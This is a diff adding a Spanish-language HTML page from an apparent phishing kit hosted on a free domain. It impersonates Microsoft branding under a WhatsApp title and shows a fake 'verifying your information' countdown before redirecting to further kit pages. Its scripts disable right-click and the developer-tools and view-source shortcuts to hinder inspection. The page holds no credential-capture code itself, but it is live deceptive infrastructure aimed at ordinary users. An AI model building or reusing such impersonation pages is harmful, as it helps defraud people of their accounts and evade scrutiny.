@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<!-- saved from url=(0044)https://vridtosaccou.kesug.com/cargando.html -->
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando - WhatsApp</title>
+    <link rel="shortcut icon" type="image/x-icon" href="https://c.s-microsoft.com/favicon.ico?v2">
+    <link href="./index4_files/css2" rel="stylesheet">
+    <link rel="stylesheet" href="./index4_files/all.min.css">
+    <style>
+        :root {
+            --blue-dark: #106ebe;
+            --blue-light: #0078d4;
+            --gray-dark: #616161;
+            --gray-light: rgba(243, 242, 241, 0.95);
+            --border-radius: 12px;
+            --box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease-in-out;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body, html {
+            height: 100%;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #1b1b1b;
+            line-height: 1.6;
+            margin: 0;
+            padding-bottom: 60px;
+            overflow: hidden;
+        }
+
+        body {
+            background: url('https://cdn.glitch.global/7177bfef-a9de-49ca-904a-bc82dc609bfd/Captura%20de%20pantalla%202025-03-13%20234358.png?v=1741927464384') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(0, 120, 212, 0.3) 0%, rgba(0, 0, 0, 0.5) 100%);
+            z-index: -1;
+        }
+
+        .loading-container {
+            width: 90%;
+            max-width: 460px;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        .loading-box {
+            width: 100%;
+            background: var(--gray-light);
+            box-shadow: var(--box-shadow);
+            border-radius: var(--border-radius);
+            padding: 32px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            z-index: 10;
+            text-align: center;
+            animation: slideIn 0.8s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        }
+
+        .loading-box img {
+            width: 100px;
+            margin-bottom: 16px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+            animation: pulseLogo 2s infinite ease-in-out;
+        }
+
+        .loading-title {
+            font-size: 26px;
+            font-weight: 600;
+            color: #242424;
+            margin: 0 0 12px 0;
+        }
+
+        .loading-subtitle {
+            font-size: 15px;
+            color: var(--gray-dark);
+            margin: 0 0 24px 0;
+        }
+
+        .progress-bar {
+            width: 85%;
+            max-width: 420px;
+            height: 6px;
+            background-color: rgba(0, 0, 0, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 20px auto;
+            position: relative;
+        }
+
+        .progress-bar-inner {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, var(--blue-light) 0%, var(--blue-dark) 100%);
+            border-radius: 3px;
+            animation: loading 30s linear forwards; /* Cambiado de 60s a 30s */
+        }
+
+        .counter-container {
+            font-size: 18px;
+            color: var(--gray-dark);
+            margin: 16px 0;
+        }
+
+        .counter {
+            display: inline-block;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--blue-light);
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: pulseCounter 1s infinite ease-in-out;
+        }
+
+        .error-message {
+            color: #d83b01;
+            font-size: 13px;
+            margin-top: 16px;
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .mobile-footer {
+            position: fixed;
+            bottom: 12px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            background: transparent;
+            padding: 0;
+            font-size: 13px;
+            color: #fff;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+        }
+
+        .mobile-footer .footer-links {
+            display: inline-flex;
+            gap: 24px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .mobile-footer .footer-link {
+            color: #fff;
+            text-decoration: none;
+            transition: var(--transition);
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+
+        .mobile-footer .footer-link:hover {
+            background: rgba(255, 255, 255, 0.1);
+            text-decoration: none;
+        }
+
+        .mobile-footer .footer-note {
+            margin-top: 10px;
+            color: #dfe6e9;
+            font-size: 11px;
+            line-height: 1.4;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.6);
+            padding: 0 12px;
+        }
+
+        .mobile-footer .footer-note a {
+            color: #a0d2ff;
+            text-decoration: none;
+            transition: var(--transition);
+        }
+
+        .mobile-footer .footer-note a:hover {
+            text-decoration: underline;
+        }
+
+        @keyframes loading {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+
+        @keyframes pulseLogo {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes pulseCounter {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background: url('https://cdn.glitch.global/7177bfef-a9de-49ca-904a-bc82dc609bfd/Captura%20de%20pantalla%202025-03-13%20234358.png?v=1741927464384') no-repeat center center fixed;
+                background-size: cover;
+                padding: 16px 0;
+            }
+
+            body::before {
+                background: linear-gradient(135deg, rgba(0, 120, 212, 0.3) 0%, rgba(0, 0, 0, 0.5) 100%);
+            }
+
+            .loading-container {
+                min-height: auto;
+                justify-content: flex-start;
+                padding: 16px 0;
+            }
+
+            .loading-box {
+                width: 100%;
+                max-width: 100%;
+                padding: 24px;
+                border-radius: 8px;
+                margin: 0 12px;
+            }
+
+            .loading-title {
+                font-size: 22px;
+                margin-bottom: 8px;
+            }
+
+            .loading-subtitle {
+                font-size: 14px;
+                margin-bottom: 16px;
+            }
+
+            .loading-box img {
+                width: 80px;
+                margin-bottom: 12px;
+            }
+
+            .counter-container {
+                font-size: 16px;
+            }
+
+            .counter {
+                font-size: 20px;
+            }
+
+            .progress-bar {
+                width: 90%;
+                height: 5px;
+            }
+
+            .mobile-footer {
+                font-size: 12px;
+                bottom: 8px;
+            }
+
+            .mobile-footer .footer-links {
+                gap: 16px;
+            }
+
+            .mobile-footer .footer-note {
+                font-size: 10px;
+                padding: 0 10px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .loading-box {
+                padding: 16px;
+            }
+
+            .loading-title {
+                font-size: 20px;
+            }
+
+            .loading-subtitle {
+                font-size: 13px;
+            }
+
+            .counter-container {
+                font-size: 14px;
+            }
+
+            .counter {
+                font-size: 18px;
+            }
+
+            .mobile-footer .footer-links {
+                gap: 12px;
+            }
+
+            .mobile-footer .footer-note {
+                font-size: 9px;
+            }
+        }
+
+        @media (min-width: 1200px) {
+            .loading-container {
+                max-width: 500px;
+            }
+
+            .loading-box {
+                padding: 40px;
+            }
+
+            .loading-title {
+                font-size: 28px;
+            }
+
+            .loading-subtitle {
+                font-size: 16px;
+            }
+
+            .counter-container {
+                font-size: 20px;
+            }
+
+            .counter {
+                font-size: 26px;
+            }
+        }
+    </style>
+</head>
+<body oncontextmenu="return false">
+    <script>
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "F12") return false;
+            if (e.ctrlKey && e.key === "u") return false;
+            if (e.ctrlKey && e.shiftKey && e.key === "I") return false;
+        });
+    </script>
+
+    <div class="loading-container">
+        <div class="loading-box" role="alert" aria-live="polite">
+         <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/LOUr1FEL2KE1FIlJK6Y5a/3b908f725e1248318ea8a294d8d0d7b1/microsoft.png" 
+                         alt="Microsoft Logo" aria-label="Logo de Microsoft">
+            <h1 class="loading-title">Verificando tu información</h1>
+            <span class="loading-subtitle">Por favor, no cierres esta página</span>
+            <div class="progress-bar">
+                <div class="progress-bar-inner"></div>
+            </div>
+            <div class="counter-container">
+                Por favor, por favor espera <span class="counter" id="counter" aria-label="Contador regresivo: 1">1</span>
+            </div>
+            <div class="error-message" id="error-message">No se pudo redirigir. <a href="https://vridtosaccou.kesug.com/index2.html" aria-label="Continuar manualmente">Haz clic aquí para continuar.</a></div>
+        </div>
+    </div>
+
+    <div class="mobile-footer">
+        <div class="footer-links">
+            <a href="" class="footer-link" aria-label="Ayuda">Ayuda</a>
+            <a href="" class="footer-link" aria-label="Términos de uso">Términos de uso</a>
+            <a href="" class="footer-link" aria-label="Privacidad y cookies">Privacidad y cookies</a>
+        </div>
+        <div class="footer-note">
+            Usa la exploración privada si este no es tu dispositivo. 
+            <a href="" aria-label="Más información sobre exploración privada">Más información</a>
+        </div>
+    </div>
+
+    <script>
+        // Contador regresivo de 15 a 0
+        let count = 15;
+        const counterElement = document.getElementById('counter');
+        const errorMessage = document.getElementById('error-message');
+
+        const countdown = setInterval(() => {
+            count--;
+            counterElement.textContent = count;
+            counterElement.setAttribute('aria-label', `Contador regresivo: ${count}`);
+            if (count === 0) {
+                clearInterval(countdown);
+                try {
+                    window.location.href = 'index5.html';
+                } catch (e) {
+                    errorMessage.style.display = 'block';
+                }
+            }
+        }, 1000);
+    </script>
+
+</body></html>
